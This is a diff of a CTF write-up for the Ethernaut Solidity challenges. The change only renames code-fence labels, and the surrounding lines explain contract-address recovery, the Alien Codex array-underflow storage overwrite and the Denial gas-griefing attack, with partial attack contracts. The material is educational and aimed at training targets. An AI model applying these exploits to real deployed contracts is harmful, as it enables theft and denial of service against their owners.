@@ -478,7 +478,7 @@ const lostAddress = ethers.utils.getContractAddress({
 });
 ```
 Or, we can use solidity language to calculate the address from scratch:
-```sol
+```solidity
 address lostcontract = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(<Recovery address>), bytes1(0x01))))));
 ```
 `0xd6`, `0x94` refer to the RLP for 20 byte address. And `0x01` refers to the nonce 1
@@ -545,21 +545,21 @@ await contract.setSolver(contract_address)
 ## 19 - Alien Codex
 
 We need to take ownership to solve this challenge.<br/> After inspecting the contract, we see no state of the `owner`. However, the contract inherits the `Ownable` contract which declares a private owner address:
-```sol
+```solidity
 contract AlienCodex is Ownable {
   bool public contact;
   bytes32[] public codex;
 
   ...
 ```
-```sol
+```solidity
 contract Ownable {
    address private _owner;
 
    ...
 ```
 So, we can think the states of the `AlienCodex` as follow:
-```sol
+```solidity
    address private _owner;
    bool public contact;
    bytes32[] public codex;
@@ -570,23 +570,23 @@ The storage layout of the contract is as follows:
 - Since `codex` state is a dynamic array, the slot of an `index i` will be calculated using the formula: `index_slot = keccak256(1) + index`
 
 The smart contract is written under version `0.5.0`, and we notice a vulnerability of **underflow**:
-```sol
+```solidity
 function retract() contacted public {
    codex.length--;
 }
 ```
 In the beginning, the codex length is 0, after calling the `retract()` function, it will cause an underflow(0 - 1 = 2^256 -1). So, after calling the `retract` function, the length of the `codex` array will be 2^256 -1, which seems **we have complete control of the whole storage of the contract**.<br>
 We know that the owner's address is stored in `slot 0`, and since the `codex` array has full control of the storage, there must be an index of the `codex` array that occupies the `slot 0`. In another words: `slot 0 = keccak256(1) + index`, which gives: `index = -keccak256(1)`. We can easily calculate the index using solidity:
-```sol
+```solidity
 uint256 array_slot = uint256(keccak256(abi.encode(uint256(1))));
 uint256 index = -array_slot;
 ```
 After getting the index that occupies the `slot 0`(the slot that contains the owner address), we can simply call the function `revise(uint i, bytes32 _content)`, and pass our address as the *_content* argument, but in a bytes32 format:
-```sol
+```solidity
  _target.revise(index, bytes32(uint256(uint160(<OUR ADDRESS>))));
 ```
 The full Attack contract code to hack the challenge:
-```sol
+```solidity
 contract AlienCodexAttack {
 
   constructor(AlienCodex _target) public {
@@ -608,7 +608,7 @@ contract AlienCodexAttack {
 
 To solve this challenge, we need to prevent the owner from receiving ether when someone calls the `withdraw` function.
 The `withdraw` function's logic is as follows:
-```sol
+```solidity
 function withdraw() public {
    uint amountToSend = address(this).balance / 100;
    // perform a call without checking return
@@ -621,7 +621,7 @@ function withdraw() public {
 }
 ```
 We notice that 1% of the contract's balance is transferred first to the partner, and then to the owner. We can simply become partner by calling the function `setWithdrawPartner` and passing our address
-```sol
+```solidity
 function setWithdrawPartner(address _partner) public {
    partner = _partner;
 }
@@ -629,7 +629,7 @@ function setWithdrawPartner(address _partner) public {
 After we become the partner, **we have control of the first ether transfer**: `partner.call{value:amountToSend}("");`.<br />
 `call` low-level method consumes almost all the gas of the transaction(63/64), so we can create an attacking contract that becomes a partner, and consumes all the gas of the transaction when it receives ether, which will result in reverting the initial transaction, and thus, the owner will not receive ether.
 
-```sol
+```solidity
 contract DenialAttack {
 
    constructor(Denial _target) {
